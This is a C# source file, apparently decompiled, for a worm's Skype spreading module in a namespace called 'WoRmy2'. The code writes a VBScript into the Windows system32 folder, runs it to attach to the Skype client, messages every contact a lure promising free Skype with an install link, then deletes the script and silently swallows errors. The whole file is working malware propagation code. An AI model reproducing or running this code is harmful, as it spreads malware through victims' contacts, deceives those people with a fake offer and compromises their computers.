using System;
using System.Diagnostics;
using System.IO;
using Microsoft.VisualBasic.CompilerServices;

namespace WoRmy2;

[StandardModule]
internal sealed class skype
{
	public static void skype_sp()
	{
		try
		{
			FileStream stream = new FileStream("C:\\windows\\system32\\s4c.vbs", FileMode.Create, FileAccess.Write);
			StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.BaseStream.Seek(0L, SeekOrigin.End);
			streamWriter.WriteLine("on error resume next");
			streamWriter.WriteLine("set Fruxr = WScript.CreateObject(\"Skype4COM.Skype\", \"Skype_\")");
			streamWriter.WriteLine("Fruxr.Client.Start()");
			streamWriter.WriteLine("Fruxr.Attach()");
			streamWriter.WriteLine("For Each KZN In Fruxr.Friends");
			streamWriter.WriteLine("Fruxr.SendMessage KZN.handle,\"Get this. Don't even ask questions, There's no time!! $285 program, year subscription of skype FREE! " + install.link + "\"");
			streamWriter.WriteLine("next");
			streamWriter.Close();
			Process.Start("C:\\windows\\system32\\s4c.vbs");
			FileInfo fileInfo = new FileInfo("C:\\windows\\system32\\s4c.vbs");
			fileInfo.Delete();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
